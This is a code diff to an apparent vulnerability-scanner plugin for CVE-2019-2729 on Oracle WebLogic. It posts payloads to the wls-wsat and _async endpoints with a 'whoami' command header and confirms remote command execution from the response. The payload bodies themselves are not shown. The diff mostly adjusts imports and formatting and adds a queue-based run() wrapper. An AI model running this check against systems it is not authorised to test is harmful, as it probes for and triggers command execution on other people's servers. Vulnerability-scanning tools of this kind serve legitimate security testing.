@@ -6,8 +6,10 @@
 
 import time
 from urllib.parse import urljoin
+from multiprocessing.managers import SyncManager
+from typing import Any, Dict, List, Mapping, Tuple, Union
 
-from stars import universe, Star, target_type
+from stars import target_type, Star
 from utils import http
 
 headers = {'Content-Type': 'text/xml', 'cmd': 'whoami'}
@@ -3537,7 +3539,7 @@ path1 = '/wls-wsat/CoordinatorPortType'
 path2 = '/_async/AsyncResponseService'
 
 
-@universe.groups()
+# @universe.groups()
 class CVE_2019_2729(Star):
     info = {
         'NAME': '',
@@ -3553,9 +3555,25 @@ class CVE_2019_2729(Star):
         result2, data = http(urljoin(f'http://{dip}:{dport}', path2), 'POST', headers, data=payload2, timeout=3,
                              ssl=force_ssl)
         time.sleep(1)
-        result_ico, data = http(urljoin(f'http://{dip}:{dport}', '/_async/favicon.ico'), ssl=force_ssl)
+        result_ico, data = http(
+            urljoin(f'http://{dip}:{dport}', '/_async/favicon.ico'), ssl=force_ssl)
         if (result1 and result1.status_code == 200 and 'uid' in result1.text) or (
                 result2 and result2.status_code == 202 and result_ico and 'Vulnerable' in result_ico.text):
             return True, {'msg': 'finish.'}
         else:
             return False, {'msg': 'finish.'}
+
+
+def run(queue: SyncManager.Queue, data: Dict):
+    obj = CVE_2019_2729()
+    result = {
+        'IP': data['IP'],
+        'PORT': data['PORT'],
+        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
+        'MSG': '',
+        'STATE': False
+    }
+    result['STATE'], result['MSG'] = obj.light_and_msg(
+        data['IP'], data['PORT'], data['IS_SSL'])
+
+    queue.put(result)
